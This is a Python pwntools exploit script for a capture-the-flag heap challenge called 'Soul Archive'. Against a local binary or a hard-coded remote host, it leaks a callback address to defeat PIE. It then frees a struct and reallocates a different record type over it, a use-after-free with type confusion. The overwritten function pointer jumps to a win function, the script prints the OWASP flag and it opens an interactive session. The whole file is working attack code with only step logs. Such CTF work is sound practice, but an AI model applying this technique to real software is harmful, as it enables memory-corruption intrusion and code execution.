#!/usr/bin/env python3
"""
SOUL // MEMORY OF THANOS - Type Confusion & UAF Exploit
Author: Suyog Jadhav
Category: Binary Exploitation / Pwn (Hard)
Target: glibc heap UAF & struct Type Confusion
"""

import os
import re
import sys
from pwn import *

context.arch = 'amd64'

HOST = "145.239.142.129"
PORT = 1339

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        bin_path = "./soul-archive-thanos/challenge/soul_archive"
        if not os.path.exists(bin_path):
            bin_path = "./soul_archive"
        return process(bin_path)

def store_soul(io, name, soul_type=1, essence="1000"):
    io.sendlineafter(b"Choice > ", b"1")
    io.sendlineafter(b"Soul name: ", name)
    io.sendlineafter(b"Type: ", str(soul_type).encode())
    io.sendlineafter(b"Initial Essence (hex value e.g. 1000): ", essence.encode())

def inspect_soul(io, idx):
    io.sendlineafter(b"Choice > ", b"2")
    io.sendlineafter(b"Enter vessel index (0-7): ", str(idx).encode())
    return io.recvuntil(b"=== SOUL ARCHIVE ===")

def merge_souls(io, a, b):
    io.sendlineafter(b"Choice > ", b"3")
    io.sendlineafter(b"First vessel index to merge: ", str(a).encode())
    io.sendlineafter(b"Second vessel index to merge: ", str(b).encode())

def erase_soul(io, idx):
    io.sendlineafter(b"Choice > ", b"4")
    io.sendlineafter(b"Enter vessel index to erase (0-7): ", str(idx).encode())

def transfer_soul(io, realm, transfer_id, flags, timestamp, raw_entropy, audit_callback):
    io.sendlineafter(b"Choice > ", b"5")
    io.sendlineafter(b"Realm of origin: ", realm)
    io.sendlineafter(b"Transfer ID (decimal): ", str(transfer_id).encode())
    io.sendlineafter(b"Entropy Flags (decimal): ", str(flags).encode())
    io.sendlineafter(b"Timestamp (hex e.g. 1337): ", hex(timestamp)[2:].encode())
    io.sendlineafter(b"Raw Entropy / Essence (hex): ", hex(raw_entropy)[2:].encode())
    io.sendlineafter(b"Audit Callback Address (hex, 0 for default): ", hex(audit_callback)[2:].encode())

def exploit():
    io = get_process()

    log.info("Step 1: Capturing 6 souls (total_captured >= 6)...")
    store_soul(io, b"Human0", soul_type=1)
    store_soul(io, b"Vessel1", soul_type=2)
    store_soul(io, b"Vessel2", soul_type=3)
    store_soul(io, b"Vessel3", soul_type=4)
    store_soul(io, b"Vessel4", soul_type=1)
    store_soul(io, b"Vessel5", soul_type=2)

    log.info("Step 2: Inspecting Vessel 0 to leak PIE base...")
    leak_data = inspect_soul(io, 0)
    match = re.search(rb"Inspect Callback: (0x[0-9a-fA-F]+)", leak_data)
    if not match:
        log.error("Failed to leak callback address!")
        return

    leak_inspect = int(match.group(1), 16)
    pie_base = leak_inspect - 0x13a9
    soul_ascension = pie_base + 0x14fb
    log.success(f"Leaked inspect_human: {hex(leak_inspect)}")
    log.success(f"Calculated PIE Base:   {hex(pie_base)}")
    log.success(f"Target soul_ascension: {hex(soul_ascension)}")

    log.info("Step 3: Executing 3 merges (merges_performed == 3)...")
    merge_souls(io, 0, 1)
    merge_souls(io, 2, 3)
    merge_souls(io, 4, 5)

    log.info("Step 4: Erasing 1 vessel (souls_erased == 1)...")
    erase_soul(io, 2)

    log.info("Step 5: Allocating TransferRecord over freed Soul at index 1 (Type Confusion)...")
    SECRET_MAGIC = 0x50574E534F554C53
    transfer_soul(
        io,
        realm=b"VormirChamber",
        transfer_id=1337,
        flags=1,
        timestamp=SECRET_MAGIC,
        raw_entropy=0x1000,
        audit_callback=soul_ascension
    )

    log.info("Step 6: Triggering hijacked inspect callback on dangling Vessel 1...")
    flag_output = inspect_soul(io, 1)
    log.success("Ascension triggered! Recovered Flag:")
    
    for line in flag_output.splitlines():
        if b"OWASP{" in line:
            print(f"[+] Flag: {line.decode().strip()}")
            break

    io.interactive()

if __name__ == "__main__":
    exploit()
